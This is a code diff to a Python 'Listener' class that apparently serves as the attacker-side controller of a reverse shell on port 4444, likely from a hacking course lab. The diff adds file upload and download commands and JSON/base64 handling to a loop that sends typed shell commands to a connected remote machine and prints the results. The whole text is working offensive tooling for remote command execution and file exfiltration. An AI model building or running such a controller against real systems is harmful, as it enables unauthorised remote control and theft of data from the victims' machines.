@@ -1,5 +1,7 @@
-import socket
-
+import socket 
+import json
+import base64
+from util import Util
 
 class Listener:
     def __init__(self, ip, port):
@@ -14,15 +16,33 @@ class Listener:
         print("[+] Connection established" + str(address))
 
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        Util.utilize_send(self.connection, command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+        return Util.utilize_receive(self.connection)
 
     def run(self):
         while True:
             command = input(">> ")
+            command = command.split(" ")
+
+            # try:
+            if command[0] == "upload":
+                file_content = Util.read_file(command[1])
+                command.append(file_content)
+
             result = self.execute_remotely(command)
+
+            if command[0] == "download" and "Error" not in result:
+                result = Util.write_file(command[1], result)
+
+            # except Exception:
+            #     result = "[-] Error during command execution"
+
             print(result)
 
-
-my_listener = Listener("10.0.2.6", 4444)
+my_listener = Listener("10.0.2.4", 4444)
 my_listener.run()
